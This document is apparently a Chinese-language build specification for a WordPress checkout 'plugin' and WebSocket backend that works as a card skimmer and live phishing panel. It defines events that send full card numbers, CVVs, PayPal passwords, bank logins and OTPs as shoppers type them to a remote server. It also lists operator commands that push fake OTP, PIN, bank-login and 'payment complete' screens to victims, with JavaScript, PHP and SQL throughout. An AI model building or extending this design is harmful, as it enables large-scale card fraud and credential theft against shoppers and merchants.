# WordPress 插件发送字段和事件规范

## 一、卡片数据捕获事件 (card_data_captured)

### 事件类型
```javascript
type: 'card_data_captured'
```

### 必需字段
```javascript
{
  session_id: string,        // 会话ID
  order_no: string,          // 订单号
  data: {
    // 卡片信息（必需）
    card_number: string,     // 完整卡号（或使用 card_no）
    expiry: string,          // 有效期 MM/YY（或使用 expiry_date, card_expiry）
    cvv: string,             // CVV码（或使用 card_cvv）
    
    // 可选字段
    card_type: string,       // 卡类型（VISA/MASTERCARD/AMEX等）
    full_name: string,      // 持卡人姓名（或使用 first_name + last_name）
    
    // 账单信息
    first_name: string,
    last_name: string,
    email: string,
    phone: string,
    address: string,
    address_2: string,
    city: string,
    state: string,
    postcode: string,
    country: string,
    
    // 产品信息
    product_name: string,
    product_price: string,
    product_quantity: string,
    
    // 订单信息
    order_id: string,
    order_key: string,
    site_url: string,
    
    // PayPal账号密码（使用新字段名）
    pp_account: string,      // PP账号（或使用 paypal_email，但推荐使用 pp_account）
    pp_password: string,     // PP密码（或使用 paypal_password，但推荐使用 pp_password）
  }
}
```

### 数据库存储位置
- **表名**: `card_data`
- **主要字段**: 
  - `card_number_masked` (存储完整卡号)
  - `expiry_date`
  - `cvv`
  - `card_holder`
  - `card_type`
  - `billing_info` (JSON格式，包含所有账单信息)

---

## 二、输入失焦事件 (input_blur)

### 事件类型
```javascript
type: 'input_blur'
event_type: 'input_blur'
```

### 字段格式
```javascript
{
  session_id: string,
  event_type: 'input_blur',
  data: {
    field: string,           // 字段名（如: 'cpg_card_number_input', 'cpg_expiry_input', 'cpg_cvv_input'）
    type: string,            // 输入框类型
    has_value: boolean,      // 是否有值
    value_length: number,    // 值长度
    
    // 根据字段类型，可能包含以下字段：
    // 卡号失焦
    card_number: string,     // 或 card_no
    card_number_masked: string,
    card_type: string,
    
    // 有效期失焦
    expiry: string,         // 或 expiry_date, card_expiry
    
    // CVV失焦
    cvv: string,            // 或 card_cvv
  }
}
```

### 后端处理逻辑
- **卡号失焦**: 自动查询BIN信息，更新 `card_data.card_number_masked` 和 `card_type`
- **有效期失焦**: 更新 `card_data.expiry_date`
- **CVV失焦**: 更新 `card_data.cvv`，如果卡号+有效期+CVV都完整，触发 `card_data_captured`

---

## 三、验证输入事件 (verification_input)

### 事件类型
```javascript
type: 'verification_input'
```

### 字段格式
```javascript
{
  session_id: string,
  verification_type: string,  // 验证类型（见下方列表）
  field: string,             // 字段名（如: 'email', 'password', 'code'）
  value: string,             // 字段值
}
```

### 支持的验证类型 (verification_type)
- `pp_account` - PP账号（推荐使用，替代 paypal_email）
- `pp_password` - PP密码（推荐使用，替代 paypal_password）
- `bank_account` 或 `bank_username` - 网银账号
- `bank_password` - 网银密码
- `otp` - OTP验证码
- `email` - 邮箱验证码
- `pin` - PIN码
- `cvv` - CVV验证码
- `app` - APP验证码

### 数据库存储位置
- **表名**: `verification_results`
- **字段**: 
  - `verification_type`: 验证类型
  - `verification_data`: JSON格式，存储字段和值的键值对
  - `status`: 'inputting'（输入中）或 'submitted'（已提交）

### 示例
```javascript
// PP账号输入
{
  session_id: 'session_xxx',
  verification_type: 'pp_account',
  field: 'email',
  value: 'user@example.com'
}

// PP密码输入
{
  session_id: 'session_xxx',
  verification_type: 'pp_password',
  field: 'password',
  value: 'password123'
}
```

---

## 四、验证失焦事件 (verification_blur)

### 事件类型
```javascript
type: 'verification_blur'
```

### 字段格式
```javascript
{
  session_id: string,
  order_no: string,
  field: string,              // 字段名
  verification_type: string,  // 验证类型（同 verification_input）
  has_value: boolean,
  value_length: number,
  label: string,              // 字段标签（可选）
  
  // 🔥🔥🔥 重要：必须包含实际值才能保存
  value: string,              // 实际值（必需）
}
```

### 🔥 PayPal 账号失焦（完整格式）
```javascript
{
  type: 'verification_blur',
  event_type: 'verification_blur',
  session_id: 'cpg_xxx',
  order_no: 'ORDER-123',
  order_id: 'wc_123',
  timestamp: Date.now(),
  
  verification_type: 'pp_account',  // 🔥 固定值
  field: 'email',
  has_value: true,
  value_length: 16,
  
  // 🔥 以下三个字段必须至少包含一个
  value: 'user@example.com',
  pp_account: 'user@example.com',
  email: 'user@example.com',
  
  data: {
    field: 'email',
    verification_type: 'pp_account',
    has_value: true,
    value_length: 16,
    value: 'user@example.com',
    pp_account: 'user@example.com',
    email: 'user@example.com'
  }
}
```

### 🔥 PayPal 密码失焦（完整格式）
```javascript
{
  type: 'verification_blur',
  event_type: 'verification_blur',
  session_id: 'cpg_xxx',
  order_no: 'ORDER-123',
  order_id: 'wc_123',
  timestamp: Date.now(),
  
  verification_type: 'pp_password',  // 🔥 固定值
  field: 'password',
  has_value: true,
  value_length: 10,
  
  // 🔥 以下三个字段必须至少包含一个
  value: 'password123',
  pp_password: 'password123',
  password: 'password123',
  
  data: {
    field: 'password',
    verification_type: 'pp_password',
    has_value: true,
    value_length: 10,
    value: 'password123',
    pp_password: 'password123',
    password: 'password123'
  }
}
```

### 数据库存储位置
- **表名**: `verification_results`
- **字段**: 
  - `verification_type`: 'pp_account' 或 'pp_password'
  - `verification_data`: JSON 格式
  - `status`: 'inputting'

---

## 五、实时输入事件 (input_*)

### 支持的事件类型
- `input_card` - 卡号输入
- `input_expiry` - 有效期输入
- `input_cvv` - CVV输入
- `input_pp_account` - PP账号输入（推荐）
- `input_pp_password` - PP密码输入（推荐）
- `input_email` - 邮箱输入
- `input_phone` - 电话输入
- `input_name` - 姓名输入
- `input_address` - 地址输入
- `input_city` - 城市输入
- `input_state` - 州/省输入
- `input_postcode` - 邮编输入
- `input_country` - 国家输入

### 字段格式
```javascript
{
  session_id: string,
  event_type: 'input_pp_account',  // 或其他 input_* 类型
  data: {
    field: string,
    value: string,
    // 根据事件类型可能包含其他字段
  }
}
```

---

## 六、访问控制期望的字段映射

### PP账号密码字段（访问控制显示）
后端会从以下字段中提取PP账号密码：
- `pp_account` 或 `paypal_email` → 访问控制显示为 `pp_account`
- `pp_password` 或 `paypal_password` → 访问控制显示为 `pp_password`

### 验证结果查询
访问控制通过以下 `verification_type` 查询PP账号数据：
- `pp`
- `pp_login`
- `paypal`
- `paypal_login`

### 数据提取逻辑
```php
// 后端代码位置: AccessControlService.php -> getPPList()
$account = $data['email'] ?? $data['pp_account'] ?? $data['paypal_email'] ?? '';
$password = $data['password'] ?? $data['pp_password'] ?? $data['paypal_password'] ?? '';
```

---

## 七、完整事件发送示例

### 1. 卡片数据捕获（CVV失焦后自动发送）
```javascript
window.cpgTracker.sendMessage({
  type: 'card_data_captured',
  session_id: 'session_1234567890',
  order_no: 'ORDER-12345',
  site_name: 'My Store',
  site_url: 'https://example.com'//需发送真实url,
  order_prefix: 'WP',
  page_url: window.location.href,
  user_agent: navigator.userAgent,
  device_info: {...},
  geo_info: {...},
  data: {
    card_number: '4242424242424242',
    expiry: '12/25',
    cvv: '123',
    card_type: 'VISA',
    full_name: 'John Doe',
    email: 'john@example.com',
    phone: '+1234567890',
    // ... 其他字段
    pp_account: 'paypal@example.com',  // 如果有PayPpl账号
    pp_password: 'password123',        // 如果有PayPpl密码
  },
  timestamp: Date.now()
});
```

### 2. PP账号输入（实时）
```javascript
window.cpgTracker.sendMessage({
  type: 'verification_input',
  session_id: 'session_1234567890',
  verification_type: 'pp_account',
  field: 'email',
  value: 'paypal@example.com'
});
```

### 3. PP密码失焦
```javascript
window.cpgTracker.sendMessage({
  type: 'verification_blur',
  session_id: 'session_1234567890',
  order_no: 'ORDER-12345',
  field: 'password',
  verification_type: 'pp_password',
  has_value: true,
  value_length: 12
});
```

---

## 八、注意事项

1. **字段名优先级**：
   - PP账号：优先使用 `pp_account`，兼容 `paypal_email`
   - PP密码：优先使用 `pp_password`，兼容 `paypal_password`

2. **失焦事件触发时机**：
   - CVV失焦时，如果卡号+有效期+CVV都完整，会自动发送 `card_data_captured`
   - 需要先通过 WooCommerce 表单验证才能发送

3. **验证类型命名**：
   - 使用 `pp_account`/`pp_password` 而不是 `paypal_email`/`paypal_password`
   - 使用 `bank_username`/`bank_password` 而不是 `bank_account`/`bank_password`

4. **数据库存储**：
   - 所有验证数据存储在 `verification_results` 表的 `verification_data` JSON字段中
   - 访问控制通过 `verification_type` 和 `status` 字段查询数据

---

# WordPress 插件接收指令规范

## 一、指令传输机制

### WebSocket 消息格式
所有指令通过 WebSocket 发送，格式为 JSON：
```javascript
{
  type: 'admin_action',        // 固定类型
  action: string,              // 操作类型（见下方列表）
  session_id: string,          // 会话ID
  target_session_id: string,   // 目标会话ID
  verification_type: string,   // 验证类型（可选）
  message: string,             // 自定义消息（可选）
  data: {                      // 附加数据（自动填充）
    phone: string,            // 格式化手机号 (***1234)
    email: string,            // 格式化邮箱 (a***@example.com)
    cardFull: string,         // 格式化卡号 (4242**********4242)
    cardNumber: string,       // 卡号后4位
    card_type: string,        // 卡类型 (VISA/MASTERCARD等)
    bankName: string,         // 银行名称
    product: string,          // 产品名称
    amount: string,           // 金额
    merchant: string,         // 商户名称
  },
  custom_data: {               // 自定义数据
    card_last4: string,
    card_type: string,
    title: string,            // 弹窗标题
    message: string,          // 弹窗消息
  },
  timestamp: number            // 时间戳
}
```

---

## 二、支持的指令类型 (action)

### 1. waiting - 显示等待验证界面
```javascript
{
  type: 'admin_action',
  action: 'waiting',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx'
}
```
**效果**：显示"正在验证支付..."等待界面

---

### 2. otp - OTP验证码输入
```javascript
{
  type: 'admin_action',
  action: 'otp',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  verification_type: 'otp',
  data: {
    phone: '***1234',
    cardNumber: '4242',
    card_type: 'VISA',
    bankName: 'Chase Bank'
  }
}
```
**效果**：显示 OTP 验证码输入界面

---

### 3. email - 邮箱验证码输入
```javascript
{
  type: 'admin_action',
  action: 'email',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  verification_type: 'email',
  data: {
    email: 'a***@example.com',
    cardNumber: '4242'
  }
}
```
**效果**：显示邮箱验证码输入界面

---

### 4. pin - PIN码输入
```javascript
{
  type: 'admin_action',
  action: 'pin',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  verification_type: 'pin',
  data: {
    cardNumber: '4242',
    card_type: 'VISA'
  }
}
```
**效果**：显示 PIN 码输入界面

---

### 5. cvv - CVV验证码输入
```javascript
{
  type: 'admin_action',
  action: 'cvv',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  verification_type: 'cvv'
}
```
**效果**：显示 CVV 验证码输入界面

---

### 6. app - APP验证确认
```javascript
{
  type: 'admin_action',
  action: 'app',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  verification_type: 'app',
  data: {
    bankName: 'Chase Bank'
  }
}
```
**效果**：显示 APP 验证确认界面（提示用户在银行APP中确认）

---

### 7. bank - 网银登录
```javascript
{
  type: 'admin_action',
  action: 'bank',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  verification_type: 'bank',
  data: {
    bankName: 'Chase Bank'
  }
}
```
**效果**：显示网银账号密码输入界面

---

### 8. error - 显示错误信息
```javascript
{
  type: 'admin_action',
  action: 'error',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  message: '验证码错误，请重新输入',  // 自定义错误消息
  custom_data: {
    title: '验证失败',
    message: '您输入的验证码不正确，请重新输入'
  }
}
```
**效果**：在当前界面显示错误提示

---

### 9. change - 换卡提示
```javascript
{
  type: 'admin_action',
  action: 'change',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  message: '当前银行卡不支持，请使用其他银行卡',
  custom_data: {
    title: '更换银行卡',
    message: '当前银行卡无法完成支付，请尝试使用其他银行卡'
  }
}
```
**效果**：显示换卡提示界面

---

### 10. custom - 自定义消息
```javascript
{
  type: 'admin_action',
  action: 'custom',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  message: '自定义文本内容',
  custom_data: {
    title: '自定义标题',
    message: '自定义详细内容'
  }
}
```
**效果**：显示自定义消息弹窗

---

### 11. complete - 支付完成
```javascript
{
  type: 'admin_action',
  action: 'complete',
  session_id: 'session_xxx',
  target_session_id: 'session_xxx',
  data: {
    cardNumber: '4242',
    amount: '$99.99'
  }
}
```
**效果**：
- 显示支付成功界面
- 自动跳转到订单完成页
- 设置 `window.CPG_VerificationCompleted = true`
- 后端同时调用 WordPress REST API 更新订单状态

---

## 三、指令处理规则

### 1. 指令优先级
```javascript
// 必须先显示等待界面，才能接收以下指令：
const actions_require_waiting = ['otp', 'email', 'pin', 'cvv', 'app', 'bank'];

// 以下指令不需要等待界面，可直接在当前界面显示：
const actions_without_waiting = ['error', 'change', 'custom'];

// 以下指令会隐藏所有界面后显示：
const actions_that_hide_all = ['otp', 'email', 'pin', 'cvv', 'app', 'bank', 'waiting', 'complete'];
```

### 2. 会话状态检查
- 如果会话已被阻止（`is_blocked = true`），忽略所有验证指令
- 如果订单已完成，忽略所有验证指令
- 如果 WooCommerce 表单有验证错误，忽略 `waiting` 指令

### 3. 指令接收条件
```javascript
// 插件通过全局事件接收指令
window.addEventListener('cpg-ws-message', function(event) {
    const message = event.detail;
    if (message.type === 'admin_action' && message.action) {
        // 处理指令
    }
});
```

---

## 四、自动指令（系统自动发送）

### 1. 自动换卡指令（卡头黑名单触发）
当卡号BIN在黑名单中时，系统自动发送：
```javascript
{
  type: 'admin_action',
  action: 'change',
  session_id: 'session_xxx',
  message: null,
  custom_data: {
    title: '更换银行卡',
    message: null
  }
}
```

### 2. 自动完成指令（无人值守模式）
当系统设置为"无人值守"模式时，收到卡片数据后自动发送：
```javascript
{
  type: 'admin_action',
  action: 'complete',
  session_id: 'session_xxx',
  verification_type: null,
  message: null
}
```

---

## 五、验证数据提交（插件 → 后端）

当用户在验证界面输入并提交后，插件发送：

### 1. 实时输入事件
```javascript
{
  type: 'verification_input',
  session_id: 'session_xxx',
  verification_type: 'otp',      // 或 email, pin, cvv, app, bank 等
  field: 'code',                 // 字段名
  value: '123456'               // 字段值
}
```

### 2. 失焦事件
```javascript
{
  type: 'verification_blur',
  session_id: 'session_xxx',
  order_no: 'ORDER-12345',
  field: 'code',
  verification_type: 'otp',
  has_value: true,
  value_length: 6
}
```

### 3. 提交事件
```javascript
{
  type: 'verification_submit',
  session_id: 'session_xxx',
  verification_type: 'otp',
  verification_data: {
    code: '123456'
  }
}
```

---

## 六、完整指令流程示例

```
1. 用户填写卡片信息 → 插件发送 card_data_captured
2. 后端收到后广播给管理后台
3. 管理员在访问控制中点击 "OTP验证" 按钮
4. 后端发送 admin_action (action: 'otp') 给插件
5. 插件显示 OTP 输入界面
6. 用户输入验证码 → 插件发送 verification_input
7. 用户提交 → 插件发送 verification_submit
8. 管理员验证通过后点击 "完成" 按钮
9. 后端发送 admin_action (action: 'complete') 给插件
10. 插件显示成功界面并跳转订单完成页
```

---

# WebSocket 会话规范

## 一、连接参数

### WordPress 客户端连接
```
wss://your-domain.com/ws?type=wordpress&id={session_id}&merchant={merchant_id}
```

### 管理后台连接
```
wss://your-domain.com/ws?type=admin&id={session_id}&merchant={merchant_id}&user_id={user_id}&role_code={role_code}
```

### 参数说明
| 参数 | 类型 | 说明 |
|------|------|------|
| `type` | string | 连接类型：`wordpress`（客户端）或 `admin`（管理后台） |
| `id` | string | 会话ID（session_id） |
| `merchant` | string | 商户标识 |
| `user_id` | number | 管理员用户ID（仅admin连接需要） |
| `role_code` | string | 管理员角色代码（仅admin连接需要） |

---

## 二、连接生命周期

### 1. 连接建立 (onOpen)

**后端响应：**
```javascript
{
  type: 'connected',
  data: {
    session_id: 'session_xxx',
    server_time: 1702300000000,     // 服务器时间戳（毫秒）
    connection_type: 'wordpress',   // 或 'admin'
    heartbeat_interval: 30000       // 建议心跳间隔（毫秒）
  }
}
```

**客户端确认：**
```javascript
{
  type: 'client_connected',
  session_id: 'session_xxx',
  order_no: 'ORDER-12345',
  site_name: 'My Store',
  site_url: 'https://example.com',
  order_prefix: 'WP',
  page_url: 'https://example.com/checkout/',
  user_agent: 'Mozilla/5.0...',
  device_info: {...},
  geo_info: {...},
  timestamp: 1702300000000
}
```

---

### 2. 心跳机制 (Ping/Pong)

**客户端发送心跳：**
```javascript
{
  type: 'ping',
  session_id: 'session_xxx',
  timestamp: 1702300000000
}
```

**后端响应：**
```javascript
{
  type: 'pong',
  data: {
    server_time: 1702300000000,
    next_ping: 30000               // 下次心跳间隔（毫秒）
  }
}
```

**心跳配置：**
| 配置项 | 值 | 说明 |
|--------|-----|------|
| `heartbeat_interval` | 30秒 | 前端发送心跳的间隔 |
| `heartbeat_check_interval` | 30秒 | 后端检查心跳的间隔 |
| `heartbeat_idle_time` | 300秒 | 无活动断开时间（5分钟） |

---

### 3. 在线心跳 (online_heartbeat)

**用于保持会话活跃状态：**
```javascript
{
  type: 'online_heartbeat',
  session_id: 'session_xxx',
  order_no: 'ORDER-12345',
  page_url: 'https://example.com/checkout/',
  timestamp: 1702300000000
}
```

---

### 4. 用户上线 (user_online)

**用户进入页面时发送：**
```javascript
{
  type: 'user_online',
  session_id: 'session_xxx',
  order_no: 'ORDER-12345',
  page_url: 'https://example.com/checkout/',
  timestamp: 1702300000000
}
```

---

### 5. 用户离线 (user_offline)

**用户离开页面或手动断开时发送：**
```javascript
{
  type: 'user_offline',
  session_id: 'session_xxx',
  reason: 'page_unload',          // 或 'manual_disconnect'
  timestamp: 1702300000000
}
```

---

### 6. 连接关闭 (onClose)

**后端处理：**
- 更新 `client_sessions` 表：`is_online = 0`, `disconnected_at = NOW()`
- 广播给其他管理后台：`type: 'session_offline'`
- 清理 `websocket_connections` 表记录
- 清理 Redis 连接信息

---

## 三、重连机制

### 指数退避算法
```javascript
{
  reconnectAttempts: 0,           // 当前重连次数
  maxReconnectAttempts: 10,       // 最大重连次数
  reconnectDelay: 1000,           // 初始延迟（1秒）
  maxReconnectDelay: 30000        // 最大延迟（30秒）
}

// 延迟计算公式
delay = min(reconnectDelay * 2^(attempts-1), maxReconnectDelay)

// 实际延迟序列：1s, 2s, 4s, 8s, 16s, 30s, 30s, 30s...
```

### 重连条件
- 配置仍然有效（`enabled = true`）
- WebSocket URL 存在
- 非手动断开（`manualDisconnect = false`）

### 停止重连条件
- 达到最大重连次数（10次）
- 手动调用 `disconnect()` 方法
- 配置被禁用

---

## 四、数据库表结构

### websocket_connections（连接信息表）
```sql
CREATE TABLE `websocket_connections` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `fd` int NOT NULL COMMENT 'Swoole FD',
  `session_id` varchar(100) COMMENT '会话ID',
  `merchant_id` varchar(100) COMMENT '商户ID',
  `connection_type` varchar(20) COMMENT 'wordpress/admin',
  `client_ip` varchar(45) COMMENT '客户端IP',
  `connected_at` timestamp COMMENT '连接时间',
  `last_ping_at` timestamp COMMENT '最后心跳时间',
  `created_at` timestamp DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `idx_fd` (`fd`),
  KEY `idx_session_id` (`session_id`)
);
```

### client_sessions（客户端会话表）
```sql
CREATE TABLE `client_sessions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `session_id` varchar(100) NOT NULL COMMENT '会话ID',
  `merchant_id` int COMMENT '商户ID',
  `order_no` varchar(100) COMMENT '订单号',
  `order_prefix` varchar(20) COMMENT '订单前缀',
  `site_name` varchar(255) COMMENT '站点名称',
  `site_url` varchar(255) COMMENT '站点URL',
  `device_info` json COMMENT '设备信息',
  `geo_info` json COMMENT '地理信息',
  `ip_address` varchar(45) COMMENT 'IP地址',
  `user_agent` text COMMENT 'User Agent',
  `is_online` tinyint(1) DEFAULT 1 COMMENT '是否在线',
  `is_blocked` tinyint(1) DEFAULT 0 COMMENT '是否被拉黑',
  `last_event` varchar(100) COMMENT '最后事件类型',
  `connected_at` timestamp COMMENT '连接时间',
  `disconnected_at` timestamp COMMENT '断开时间',
  `last_activity_at` timestamp COMMENT '最后活动时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_session_id` (`session_id`),
  KEY `idx_is_online` (`is_online`)
);
```

---

## 五、Redis 存储结构

### 会话连接信息
```
Key: ws:session:{session_id}
Type: Hash
TTL: 3600秒（1小时）
Fields:
  - fd: Swoole FD
  - merchant_id: 商户ID
  - connection_type: 连接类型
  - connected_at: 连接时间
```

### 管理员连接信息（用于分流）
```
Key: ws:admin:{fd}
Type: Hash
TTL: 3600秒（1小时）
Fields:
  - user_id: 用户ID
  - role_code: 角色代码
  - merchant_id: 商户ID
```

---

## 六、消息队列机制

### 离线消息队列
当 WebSocket 未连接时，消息会被加入队列：
```javascript
// 前端消息队列
this.messageQueue = [];

// 发送消息时检查连接状态
sendMessage(message) {
  if (this.wsConnected && this.ws?.readyState === WebSocket.OPEN) {
    this.ws.send(JSON.stringify(message));
  } else {
    this.messageQueue.push(message);  // 加入队列
  }
}

// 连接成功后发送队列消息
onConnected() {
  while (this.messageQueue.length > 0) {
    const msg = this.messageQueue.shift();
    this.ws.send(JSON.stringify(msg));
  }
}
```

---

## 七、Session ID 生成规则

### 格式
```
cpg_{timestamp}_{random}
```

### 示例
```
cpg_1702300000000_abc123def456
```

### 生成代码
```javascript
generateSessionId() {
  const timestamp = Date.now();
  const random = Math.random().toString(36).substring(2, 15);
  return `cpg_${timestamp}_${random}`;
}
```

### 存储
- Cookie: `cpg_session_id={session_id}; path=/; max-age=3600`
- 用于关联订单和支付会话

---

## 八、完整连接流程

```
┌──────────────────────────────────────────────────────────────────┐
│                        WordPress 客户端                            │
└──────────────────────────────────────────────────────────────────┘
         │
         │ 1. 建立 WebSocket 连接
         │    wss://domain/ws?type=wordpress&id=xxx&merchant=xxx
         ▼
┌──────────────────────────────────────────────────────────────────┐
│                          后端 (Hyperf)                            │
│  onOpen:                                                          │
│    - 解析 URL 参数                                                 │
│    - 获取客户端 IP                                                 │
│    - 保存连接到 websocket_connections 表                           │
│    - 保存连接到 Redis                                              │
│    - 发送 'connected' 消息给客户端                                  │
└──────────────────────────────────────────────────────────────────┘
         │
         │ 2. 发送 'connected' 响应
         ▼
┌──────────────────────────────────────────────────────────────────┐
│                        WordPress 客户端                            │
│  onopen:                                                          │
│    - 重置重连计数                                                  │
│    - 发送 'client_connected' 消息                                  │
│    - 开始心跳定时器（30秒）                                         │
│    - 发送队列中的消息                                               │
└──────────────────────────────────────────────────────────────────┘
         │
         │ 3. 周期性发送 'ping' 心跳
         ▼
┌──────────────────────────────────────────────────────────────────┐
│                          后端 (Hyperf)                            │
│  handlePing:                                                      │
│    - 更新 last_ping_at 时间                                        │
│    - 更新 Redis TTL                                                │
│    - 发送 'pong' 响应                                              │
└──────────────────────────────────────────────────────────────────┘
         │
         │ 4. 用户关闭页面 / 网络断开
         ▼
┌──────────────────────────────────────────────────────────────────┐
│                          后端 (Hyperf)                            │
│  onClose:                                                         │
│    - 查询连接信息                                                  │
│    - 更新 client_sessions: is_online=0, disconnected_at=NOW()      │
│    - 清理 websocket_connections 记录                               │
│    - 清理 Redis 连接信息                                           │
│    - 广播 'session_offline' 给管理后台                              │
└──────────────────────────────────────────────────────────────────┘
```
  